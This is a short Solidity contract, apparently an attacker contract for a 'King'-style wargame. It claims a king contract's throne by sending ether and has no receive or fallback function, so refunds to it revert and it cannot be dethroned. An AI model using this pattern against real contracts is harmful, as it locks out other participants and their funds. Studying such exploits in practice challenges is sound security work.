// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingMaker{

    constructor()payable {}
    
    function takeOver(address payable kingContract, uint256 amount) public{
       (bool success, ) = kingContract.call{value: amount}("");
       require(success);
    }

}